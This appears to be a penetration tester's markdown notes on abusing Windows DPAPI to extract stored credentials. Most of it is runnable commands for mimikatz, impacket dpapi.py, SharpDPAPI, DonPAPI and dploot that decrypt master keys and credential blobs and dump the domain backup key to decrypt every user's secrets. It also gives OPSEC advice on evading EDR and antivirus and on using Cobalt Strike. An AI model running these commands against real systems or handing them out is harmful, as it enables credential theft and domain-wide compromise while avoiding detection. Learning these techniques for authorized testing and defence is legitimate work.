# DPAPI abuse

- Requirements
	- Your current users password
	- masterykey
	- credential Blob
		- check local
		- check roaming

# Enumeration

```
cmdkey /list
vaultcmd /list
```


The DPAPI (Data Protection API) is an internal component in the Windows system. It allows various applications to store sensitive data (e.g. passwords). The data are stored in the users directory and are secured by user-specific master keys derived from the users password. 

the master key location;

```powershell
C:\Users\$USER\AppData\Roaming\Microsoft\Protect\$SUID\$GUID
```

Application like Google Chrome, Outlook, Internet Explorer, Skype use the DPAPI. Windows also uses that API for sensitive information like Wi-Fi passwords, certificates, RDP connection passwords, and many more.

The credential blog locations are usually;

```powershell
C:\Users\$USER\AppData\Local\Microsoft\Credentials\
C:\Users\$USER\AppData\Roaming\Microsoft\Credentials\
```

# Remote

download the files locally to be able to use dpapi.


to be able to hack DPAPI is that we first need to be able to decrypt the master key, the **DECRYPTED** master key is then later used to decrypt the credential blogs

```python
dpapi.py masterkey -file $MASTER_KEY  -sid $SID_HERE  -password $paassword

dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407  -sid S-1-5-21-1487982659-1829050783-2281216199-1107  -password 'ChefSteph2025!'
```


```python
dpapi.py credential -file $CREDENTIAL_BLOB -key $DECRYPTED_MASTERKEY


dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0xd9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84
```



## Local


```powershell
PS C:\Users\Administrator> gci -Force C:\users\Administrator\appdata\local\microsoft\credentials\


    Directory: C:\users\Administrator\appdata\local\microsoft\credentials


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-         3/22/2024   1:37 PM          11120 DFBE70A7E5CC19A398EBF1B96859CE5D
```

Credential files: `DFBE70A7E5CC19A398EBF1B96859CE5D`
MasterKey: ``


```
mimikatz # dpapi::cred /in:C:\Users\Administrator\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D
**BLOB**
  dwVersion          : 00000001 - 1
  guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
  dwMasterKeyVersion : 00000001 - 1
  guidMasterKey      : {7e52ba17-5180-486c-94fa-9d87425b6a90}
  dwFlags            : 20000000 - 536870912 (system ; )
  dwDescriptionLen   : 00000030 - 48
  szDescription      : Local Credential Data

  algCrypt           : 00006610 - 26128 (CALG_AES_256)
  dwAlgCryptLen      : 00000100 - 256
  dwSaltLen          : 00000020 - 32
  pbSalt             : b801009faacdbcb308c377d5600266d45305940e22f8fc4e802ef996e2107523
  dwHmacKeyLen       : 00000000 - 0
  pbHmackKey         :
  algHash            : 0000800e - 32782 (CALG_SHA_512)
  dwAlgHashLen       : 00000200 - 512
  dwHmac2KeyLen      : 00000020 - 32
  pbHmack2Key        : c9e643d7bde81b9966711e14472758372d943571d3a1515e4c1e823c0d0b22f5
  dwDataLen          : 00002a60 - 10848
```



```powershell
PS C:\Users\Administrator> gci -Force C:\users\Administrator\appdata\roaming\microsoft\protect\


    Directory: C:\users\Administrator\appdata\roaming\microsoft\protect


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d---s-         3/22/2024   1:37 PM                S-1-5-21-3115080475-3422209674-2867084633-500
-a-hs-         3/22/2024   1:37 PM             24 CREDHIST
-a-hs-         3/22/2024   1:58 PM             76 SYNCHIST


```


```powershell
PS C:\Users\Administrator> gci -Force C:\users\Administrator\appdata\roaming\microsoft\protect\S-1-5-21-3115080475-3422209674-2867084633-500\7e52ba17-5180-486c-94fa-9d87425b6a90


    Directory: C:\users\Administrator\appdata\roaming\microsoft\protect\S-1-5-21-3115080475-3422209674-2867084633-500


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-         3/22/2024   1:58 PM            468 7e52ba17-5180-486c-94fa-9d87425b6a90
```



## Scenario 2: On host (with admin)

Check for credentials blobs existence

```powershell
dir C:\users\<user>\appdata\local\microsoft\credentials\
dir C:\users\<user>\appdata\local\microsoft\credentials\<blob>
```

This is where our MasterKey(s) are stored

```powershell
C:\users\<user>\appdata\roaming\microsoft\protect\
C:\users\<user>\appdata\roaming\microsoft\protect\<SID>\<MasterKey>
```

So now using mimikatz use the following commands

```powershell
mimikatz dpapi::cred /in:C:\users\<user>\appdata\local\microsoft\credentials\<credential blob>
```

```powershell
mimikatz dpapi::masterkey /in:C:\users\<user>\appdata\roaming\microsoft\protect\<SID>\<MasterKey blob> /rpc
```

```powershell
mimikatz dpapi::cred /in:C:\users\<user>\appdata\local\microsoft\credentials\<credential blob> /masterkey:<masterkey_blob>
```


### Backup key, large scale automation

To automate the process of getting the credential blobs for each user, we can use [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI) , Once you are a Domain Administrator we have sufficient permissions to request what’s called the Domain Backup Key. This is significant because this key allows for the decryption of ANY MasterKey(s) throughout the domain. And better yet, this key **NEVER** changes! Talk about fortuitous right?

Output in terminal:
```
SharpDPAPI.exe backupkey
```

Outputted to a file:
```
SharpDPAPI.exe backupkey /file:key.pvk
```

Now to use the `triage` command to make our lives MUCH easier 

```
SharpDPAPI.exe triage /pvk:key.pvk
```

### OPSEC

Running `execute-assembly` ofcourse is prefered obviously when using cobalt strike.


### references

https://z3r0th.medium.com/abusing-dpapi-40b76d3ff5eb

---

# Scrap 

## DonPAPI (Unstable and pretty shitty it seems)
*Dumping relevant information on compromised targets without AV detection*

https://github.com/login-securite/DonPAPI

Dump all secrets of the target machine with an Domain admin account :
```
DonPAPI domain/user:passw0rd@target
```

or a Local one :
```python
DonPAPI -local_auth user@target
```

Using PtH:
```shell
DonPAPI --hashes <LM>:<NT> domain/user@target
```

Using kerberos (-k):
```shell
DonPAPI -k domain/user@target
```

Using a user with LAPS password reading rights:
```shell
DonPAPI -laps domain/user:passw0rd@target
```

### Backup key, large scale automation

When a domain admin user is available, it is possible to dump the domain **backup key** using impacket `dpapi.py` tool:

```shell
dpapi.py backupkeys --export -t domain/user:passw0rd@target_dc_ip
```

Or with [dploot](https://github.com/zblurx/dploot):

```shell
dploot backupkeys -u username -p password -d domain 192.168.56.30
```

This backup key (pvk file) can then be used to dump **all** domain user's secrets!

```shell
DonPAPI -pvk domain_backupkey.pvk domain/user:passw0rd@domain_network_list
```


### OPSEC

The RemoteOps part can be spoted by some EDR (it's basically a secretdump). It can be disabled using `--no_remoteops` flag, but then the machine DPAPI key won't be retrieved, and scheduled task credentials/Wi-Fi passwords won't be harvested.


## dploot (dumping keys)

https://github.com/zblurx/dploot.git

Using a local administrator account
```
dploot machinecertificates -d waza.local -u Administrator -p 'Password!123' 192.168.56.14 -quiet
```

As a domain administrator
```
dploot backupkey -d waza.local -u Administrator -p 'Password!123' 192.168.56.112 -quiet
[-] Exporting domain backupkey to file key.pvk
```


https://github.com/zblurx/dploot <-------------- READ ME MORE.





https://z3r0th.medium.com/abusing-dpapi-40b76d3ff5eb



https://www.sygnia.co/blog/the-downfall-of-dpapis-top-secret-weapon/